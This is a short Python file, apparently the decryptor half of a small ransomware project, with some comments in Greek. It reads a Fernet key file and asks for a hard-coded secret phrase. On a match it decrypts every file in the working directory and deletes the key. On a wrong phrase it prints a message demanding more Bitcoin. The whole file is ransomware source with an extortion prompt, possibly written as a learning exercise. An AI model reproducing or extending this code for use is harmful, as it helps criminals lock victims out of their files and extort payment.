import os

from cryptography.fernet import Fernet 


isPhraseRun = True 
files = [] #Creat a list 
 

for file in os.listdir(): # Επιστρεφη ολα τα αρχεια
    if file in ["malware_Encryption.py", "theKey.Key", "malware_Decryption.py","malware_main.py"]:
        continue 
    if os.path.isfile(file): ## Ελέγχος αν το τρέχον στοιχείο είναι αρχείο και όχι φάκελος.
        files.append(file)

#print(files, "\n")



with open ("theKey.Key","rb") as Key:
    secretKey = Key.read()




while(isPhraseRun):
    secreatphrase= "PADA"

    userInput = input("Enter the phrase to decrypt your files: \n")

    if userInput == secreatphrase:
        for file in files:
            with open(file,"rb") as thefile:
                conteiner = thefile.read()
            conteiner_decryption = Fernet(secretKey).decrypt(conteiner)
            with open(file,"wb") as thefile:
                thefile.write(conteiner_decryption) 
        print("Congrats your files is yours again !!!! \n")    
        isPhraseRun = False
        if os.path.exists("theKey.Key"):
            os.remove("theKey.Key")
    else:
        print("Οops! The secret phrase is wrong. Give me more Bitcoin! \n")
    